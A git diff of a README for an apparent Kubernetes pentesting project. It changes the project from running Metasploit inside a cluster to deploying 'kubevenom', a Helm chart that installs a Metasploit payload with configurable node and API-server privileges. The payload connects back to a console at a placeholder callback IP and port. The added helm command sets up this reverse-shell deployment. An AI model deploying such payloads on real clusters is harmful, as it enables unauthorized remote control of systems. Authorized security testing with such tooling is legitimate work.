@@ -1,9 +1,10 @@
 
-# Running Metasploit Framework Inside Kubernetes
+# Running Metasploit Framework Against Kubernetes
 
-Running metasploit framework inside Kubernetes enables pentesters to security test cluster components such as the API Server, as well as internal application components or micro-services.
+Running metasploit framework against Kubernetes enables pentesters to security test cluster components such as the API Server, as well as internal application components or micro-services.
 
-The installation chart also offers to install & run metasploit framework with different priviliges and permissions with respect to Kubernetes node hosting metasploit, as well as Kubernetes API server itself - see 'priviliges' section under values.yaml
+The installation chart (kubevenom) also offers to install & run a metasploit payload, that connects back to metasploit console.
+The payload can be deployed with different priviliges and permissions with respect to Kubernetes node hosting metasploit payload, as well as Kubernetes API server itself - see 'priviliges' section under values.yaml
 
 ```yaml
 priviliges:
@@ -36,17 +37,10 @@ priviliges:
 2. Make sure you have an available Kubernetes cluster to deploy metasploit. You can install a local Kubernetes cluster using [KIND](https://kind.sigs.k8s.io/docs/user/quick-start/#installation)
     > You can create local KIND cluster by running  `make create-kind-cluster`
 
-3. Install the helm chart by running:
+3. Install kubevenom helm chart by running:
 
-    ```sh
-    helm dep update ./metasploit
-    helm upgrade --create-namespace -i -n metasploit metasploit ./metasploit
-    ```
-
-4. Run metasploit console by running:
-
-    ```sh
-    export MSF_POD_NAME=$(kubectl get pods --namespace metasploit -l "app.kubernetes.io/name=metasploit,app.kubernetes.io/instance=metasploit" -o jsonpath="{.items[0].metadata.name}")
-
-    kubectl --namespace metasploit exec -it $MSF_POD_NAME -- msfconsole.sh
-    ```  
+```sh
+export MSF_PORT="<routeable port from inside cluster>"
+export MSF_IPADDRESS="<routeable ip from inside cluster>"
+helm upgrade --create-namespace -i -n metasploit kubevenom ./kubevenom --set lport=$MSF_PORT --set lhost=$MSF_IPADDRESS
+```
